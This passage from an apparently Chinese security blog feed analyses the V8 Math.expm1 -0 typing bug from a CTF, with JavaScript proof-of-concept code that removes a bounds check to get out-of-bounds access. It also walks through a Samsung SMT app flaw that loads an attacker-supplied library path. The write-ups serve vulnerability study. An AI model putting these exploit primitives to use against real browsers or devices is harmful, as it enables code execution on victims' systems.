&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d8&amp;gt; Object.is(Math.expm1(-0), -0)
true
d8&amp;gt; Object.is(Math.expm1(-0), 0)
false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以我们可以得到一个结论：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1(-0)&lt;/code&gt;得到的结果是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么这个结论有什么用呢？&lt;/p&gt;

&lt;p&gt;我们结合一开始的优化代码来分析，在对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;的时候，Turbofan认为这个函数只能返回以下几个类型，这其中并不包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;在Turbofan里用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MinusZero&lt;/code&gt;来表示&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;return Type::Union(Type::PlainNumber(), Type::NaN(), t-&amp;gt;zone());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说：在优化结束之后，会把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.is(Math.expm1(-0), -0)&lt;/code&gt;直接折叠为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，也就是常量折叠&lt;/p&gt;

&lt;p&gt;我们接下来通过跟踪优化过程来分析&lt;/p&gt;

&lt;p&gt;首先跟踪运行提供的Poc，我们发现两次都输出的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;，啥情况？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  x64.debug git:(CRBUG-880207) ./d8 --allow-natives-syntax --trace-turbo Poc.js
Concurrent recompilation has been disabled for tracing.
true
---------------------------------------------------
Begin compiling method foo using Turbofan
---------------------------------------------------
Finished compiling method foo using Turbofan
true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据文章《Exploiting the Math.expm1 typing bug in V8》可以看到原因&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用turbolizer查看优化过程&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/321B74C3EDBF0E7D8E6C343B73EFC5A1.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Float64Expm1&lt;/code&gt;节点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Number&lt;/code&gt;，这个类型是包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;的，这就有点难办了&lt;/p&gt;

&lt;p&gt;观察题目给的patch可以看到，其实只是补了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typer.cc&lt;/code&gt;，而没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation-typer.cc&lt;/code&gt;，所以这个漏洞只能在builtin函数的调用过程中触发（注意看上面提到的谷歌打的三个补丁，第一个补丁补了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation-typer.cc&lt;/code&gt;，第二个和第三个补丁补了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typer.cc&lt;/code&gt;，这两个文件对应着两个触发路径，题目的patch把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typer.cc&lt;/code&gt;这个文件的漏洞给引入了）&lt;/p&gt;

&lt;p&gt;上面那篇文章的作者提到了当我们触发一次优化之后（这一步优化可以不需要），传入一个非Number类型的参数，就可以触发&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deoptimization&lt;/code&gt;，，此时转交给Ignition解释器，然后再主动触发一次优化，那么Turbofan的反馈数据里就会有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Number&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;非Number&lt;/code&gt;两种信息，在优化的时候就会使用能够处理多种类型数据的builtin函数，也就能触发一个builtin函数调用了&lt;/p&gt;

&lt;p&gt;所以Poc如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo(x) {
    return Object.is(Math.expm1(x), -0);
}

console.log(foo(0));

for(var i = 0; i &amp;lt; 100000; i++)
    foo(&quot;0&quot;);

console.log(foo(-0));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同样的，我们来看跟踪过程&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  x64.debug git:(CRBUG-880207) ./d8 --allow-natives-syntax --trace-turbo Poc.js
Concurrent recompilation has been disabled for tracing.
---------------------------------------------------
Begin compiling method foo using Turbofan
---------------------------------------------------
Finished compiling method foo using Turbofan
---------------------------------------------------
Begin compiling method foo using Turbofan
---------------------------------------------------
Finished compiling method foo using Turbofan
---------------------------------------------------
Begin compiling method  using Turbofan
---------------------------------------------------
Finished compiling method  using Turbofan
false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;阶段，注意看红色框框里的内容，我们可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PlainNumber | NaN&lt;/code&gt;，这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;不包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，右边的节点类型是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MinusZero&lt;/code&gt;也就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，这两个数据传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SameValue&lt;/code&gt;节点进行比较，这明显是恒不相等的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9A6301EE2040F342941B2B4D867CF083.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typed lowering&lt;/code&gt;阶段，这三个节点会进行常量折叠为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A290C3C2969C67D85B631703F6F52FED.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我们可以看到打印出来的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;到这里最基本的漏洞成因已经分析清楚了，我们来看如何利用这个漏洞呢？&lt;/p&gt;

&lt;p&gt;先来简单构造一段代码，我们创建一个数组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt;，然后构造一个变量b，由上面的分析可知，b恒为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，也就是说最后返回的恒为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0]&lt;/code&gt;，所以我们要想办法不能让它进行常量折叠，折叠掉就没法玩了，我们需要的是一个效果就是它在真实计算的时候，返回的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;，如果不折叠肯定是返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;，但是它在进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typing&lt;/code&gt;的时候，让它传播错误的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，来实现某些错误的优化&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let b = Object.is(Math.expm1(x), -0);
    return a[b * 1337];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果我们能够让错误的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;信息传播下去，比如利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[false*1337]&lt;/code&gt;会被分析为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0]&lt;/code&gt;来去除边界检查且没有发生常量折叠，因为常量折叠之后肯定就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，去获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0]&lt;/code&gt;的值没有意义，但是如果没有被折叠，计算的结果是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;，所以此时访问的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[true*1337] ==&amp;gt; a[1337]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;也就是说：我们利用错误的类型分析绕过边界检查，但是不让它进行常量折叠&lt;/p&gt;

&lt;p&gt;如果不理解上面的意思，我们可以实际来分析下流程，会更好理解&lt;/p&gt;

&lt;p&gt;以下这张图是上面提到那篇文章作者文章里的流程图，注意看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typing&lt;/code&gt;，这里就是进行类型分析的地方，一共有三处，我们可以看到前两处完成之后，会进行一次常量折叠，我们一定要绕过，不能让它进行常量折叠&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3D48150A0FADE40FB59DB4DC8CF02A73.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同时我们看到在最后一次&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typing&lt;/code&gt;之前，是逃逸分析，什么是逃逸分析呢？&lt;/p&gt;

&lt;p&gt;来看代码，逃逸分析是指分析变量有没有逃离当前作用域，如果没有，那就可以直接分配为栈变量，再进行其它的一些优化操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function f() {
    let o = {a: 5};
    return o.a;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;逃逸分析前，这里还是通过层层获取数据的方式&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C8DBFFDFC178F2A323A79A394D8E05EF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;逃逸分析后，直接就是常量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9B8BC4D6BC07BA11A80593A0872E421D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以结合这个特性，我们利用逃逸分析来绕过前两个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typing&lt;/code&gt;，这样Turbofan分析不出来这个是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，就没法准确判断类型，只能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Boolean&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 1337];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改Poc&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 1337];
}

console.log(foo(0));

for(var i = 0; i &amp;lt; 100000; i++)
    foo(&quot;0&quot;);

console.log(foo(-0));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟踪优化过程，我们可以看到在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;阶段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SameValue&lt;/code&gt;节点类型是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Boolean&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/89D831FDD07E27C4A162F6E5753F753A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;逃逸分析完成后，我们可以观察到，两边的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;都确定了，此处没有被优化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E9410355D091FE782209EB8D26D645B6.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Simplified Lowering&lt;/code&gt;阶段，此处会进行最后一次&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typing&lt;/code&gt;，我们利用这次机会，传播错误的类型信息，可以看到错误的信息被传下去之后，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkbound&lt;/code&gt;节点被移除了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A08B70D49BE62CD8079F41756C06258D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, we have gotten an out-of-bound read/write primitive now&lt;/p&gt;

&lt;p&gt;可以看到我们这里获得越界读写非常不好用，需要在被优化的函数里进行操作，所以我们利用这个不好用的越界读写，去修改掉部署在内存后面的一个数组长度，然后那个数组就获得了相对好用的越界读写能力&lt;/p&gt;

&lt;p&gt;所以拥有了一个任意读写的数组，常规方法写利用即可&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/&quot;&gt;Exploiting the Math.expm1 typing bug in V8&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jaybosamiya.com/blog/2019/01/02/krautflare/&quot;&gt;35C3_CTF_2018 Krautflare分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jaybosamiya.com/blog/2019/01/02/krautflare/&quot;&gt;Exploiting Chrome V8: Krautflare (35C3 CTF 2018)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Mon, 18 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/18/BUG-880207-Math.expm1%E8%BF%9B%E8%A1%8CJIT%E6%9C%AA%E6%AD%A3%E7%A1%AE%E5%A4%84%E7%90%86-0%E7%B1%BB%E5%9E%8B.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/18/BUG-880207-Math.expm1%E8%BF%9B%E8%A1%8CJIT%E6%9C%AA%E6%AD%A3%E7%A1%AE%E5%A4%84%E7%90%86-0%E7%B1%BB%E5%9E%8B.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.11.11 - 2019.11.15</title>
                <description>&lt;p&gt;组里又走一大佬，算下来从我去年四月份入职以来已经走了四个了&lt;/p&gt;

&lt;p&gt;祝师傅们前程似锦！&lt;/p&gt;

&lt;p&gt;上周提到谷歌紧急修复的一个在野利用的洞（1019226），补丁如下，及时修复吧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromium.googlesource.com/chromium/src/+/6a2e670a243b815cf043f8da4d26ecb9a64d307b%5E%21/#F0&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;diff --git a/third_party/blink/renderer/modules/webaudio/convolver_node.cc b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
index c67a0ba..ce19fe6 100644
--- a/third_party/blink/renderer/modules/webaudio/convolver_node.cc
+++ b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
@@ -103,6 +103,8 @@
   DCHECK(IsMainThread());
 
   if (!buffer) {
+    BaseAudioContext::GraphAutoLocker context_locker(Context());
+    MutexLocker locker(process_lock_);
     reverb_.reset();
     shared_buffer_ = nullptr;
     return;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iOS越狱大杀器，目前还处于early beta阶段，可能会失败，多尝试几次，不完美越狱，重启后需要重新越狱&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://checkra.in/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lucas讲了一个相关的议题，分享了这个工具背后的BootROM漏洞的分析和利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://iokit.racing/oneweirdtrick.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上周的安全周报最后面我放了Flanker_hqd的一篇漏洞分析文章链接，不知道大家看了没有，没看也没事，我这周分析了一下，这里简单讲下漏洞细节&lt;/p&gt;

&lt;p&gt;首先三星有一个叫SamsungSMT这么个应用，具体是干啥的我不是很清楚&lt;/p&gt;

&lt;p&gt;它有一个导出组件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.SMT.SamsungTTSService&lt;/code&gt;，其&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate&lt;/code&gt;方法里动态注册了一个BroadcastReceiver，我们知道这默认是导出的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void onCreate() {
    ...
    LangPackMgr.get().a(this.getApplicationContext());  // 入口
    ...
    super.onCreate();
}

public void a(Context context) {
    if(this.context == null) {
        ...
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;);
        this.context.registerReceiver(this.LangPackMgr$2, intentFilter);  // 注册一个广播接收器：&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注册的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$2&lt;/code&gt;会将传入的Intent内两个数据作为参数构造一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$UpdateEngineInfo&lt;/code&gt;对象，然后加到一个队列里，经过一系列判断，开始更新&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BroadcastReceiver LangPackMgr$2;

public LangPackMgr() {
    ...
    this.LangPackMgr$2 = new LangPackMgr$2(this);
}

public void onReceive(Context context, Intent intent) {
    int v7 = -1;
    if(intent.getAction().equals(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;)) {
        ArrayList arrayList = intent.getCharSequenceArrayListExtra(&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;);
        Class_l v1 = new Class_l(arrayList.toArray(new String[arrayList.size()]));
        v1.a(intent.getStringExtra(&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;));
        v1.setArrayList(intent.getCharSequenceArrayListExtra(&quot;BROADCAST_DB_FILELIST&quot;));
        v1.a(true);
        int Extra_SMT_ENGINE_VERSION = intent.getIntExtra(&quot;SMT_ENGINE_VERSION&quot;, v7);
        String Extra_SMT_ENGINE_PATH = intent.getStringExtra(&quot;SMT_ENGINE_PATH&quot;);
        if(Extra_SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion() &amp;amp;&amp;amp; (r.isFileExist(Extra_SMT_ENGINE_PATH))) {
            if(j.a(Extra_SMT_ENGINE_PATH)) {
                LangPackMgr.getUpdateEngineQueue(this.a).add(new LangPackMgr$UpdateEngineInfo(Extra_SMT_ENGINE_VERSION, Extra_SMT_ENGINE_PATH));
                LOG.b(q.b, &quot;LangPackMgr - Add candidate engine [%d][%s]&quot;, new Object[]{Integer.valueOf(Extra_SMT_ENGINE_VERSION), Extra_SMT_ENGINE_PATH});
            }
        ...
        LangPackMgr.doUpdateEngine(this.a);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用多线程来执行，但是在线程里我们看到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadEngine()&lt;/code&gt;方法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void doUpdateEngine(LangPackMgr langPackMgr) {
    langPackMgr.updateEngine();
}

private void updateEngine() {
    if(this.mThreadUpdateEngine == null || !this.mThreadUpdateEngine.isAlive()) {
        this.mThreadUpdateEngine = new LangPackMgr$EngineUpdateThread(this, null);
        this.mThreadUpdateEngine.start();
    }
}

public void run() {
    ...
        if(v1 != null &amp;amp;&amp;amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion()) {
            l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);
            if(SmtTTS.get().reloadEngine()) {   &amp;lt;== 注意看这里
                LOG.c(&quot;Restart engine...&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟入可以看到直接使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.load()&lt;/code&gt;加载了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v0_2&lt;/code&gt;指向的路径，那么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l.a().k()&lt;/code&gt;返回的是什么呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public boolean reloadEngine() {
    boolean v0_3;
    boolean v3;
    this.e();
    try {
        String v0_2 = l.a().k();
        if(r.isFileExist(v0_2)) {
            System.load(v0_2);
        }
        else {
            goto label_71;
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadEngine()&lt;/code&gt;上两句代码，这里说的是如果版本号高于本地数据，就进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;逻辑处理，可以看到，最后将Intent内&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_ENGINE_PATH&quot;&lt;/code&gt;的数据写到本地SP文件的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_INSTALLED_ENGINE_PATH&quot;&lt;/code&gt;字段&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(v1 != null &amp;amp;&amp;amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion()) {
    l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);    &amp;lt;== 1
    
public void b(String param_SMT_ENGINE_PATH) {
    if(param_SMT_ENGINE_PATH != null) {
        l.SMT_LATEST_INSTALLED_ENGINE_PATH = param_SMT_ENGINE_PATH;
        this.a(&quot;SMT_LATEST_INSTALLED_ENGINE_PATH&quot;, param_SMT_ENGINE_PATH);  &amp;lt;== 2
    }
    else {
        LOG.d(&quot;Try to set SMT_INSTALLED_ENGINE_PATH with null&quot;);
    }
}

public void a(String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    this.a(n.a, SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &amp;lt;== 3
}

public void a(n arg2, String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    SharedPreferences sp = this.c(arg2);
    if(sp != null) {
        SharedPreferences$Editor sp$editor = sp.edit();
        sp$editor.putString(SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &amp;lt;== 4
        sp$editor.commit();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l.a().k()&lt;/code&gt;，可以看到返回值就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_ENGINE_PATH&quot;&lt;/code&gt;指向的数据，这个数据我们可控，修改Intent即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public String k() {
    if(r.isFileExist(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
        try {
            if(j.a(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
                String v0_1 = l.SMT_LATEST_INSTALLED_ENGINE_PATH;
                return v0_1;
            }

            LOG.a(&quot;Invalid INSTALLED_ENGINE_PATH = &quot; + l.SMT_LATEST_INSTALLED_ENGINE_PATH);
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }
    }

    this.j();
    return null;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个漏洞核心的部分大概就是上面这些，其它包括主动触发，利用等在内的详细分析文章还在写（我怎么感觉每次都是详细的文章还在写:))，这是一个双下巴的胖子的微笑）&lt;/p&gt;

&lt;p&gt;我觉得我搞安全不是一个死磕的人，更加的偏向思考以及&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;投机&lt;/code&gt;，从去年开始的时间我都在想关于逻辑层的漏洞挖掘方式，我跟李神探聊过我思考的一些方法和思路&lt;/p&gt;

&lt;p&gt;举个例子，比如我们要挖掘一个导出组件接收Intent，然后获取了其中的数据作为参数不做任何检查直接调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity()&lt;/code&gt;这样的一个漏洞，去年我的想法是使用控制流，李神探和我说可以使用污点分析，但是这些最开始的想法超出了我的能力范围，那段时间还有很多其它的事情要做，工作的业务，以及浏览器安全的学习，所以这部分的工作一直处于思考如何使用更优雅的方式去实现的阶段&lt;/p&gt;

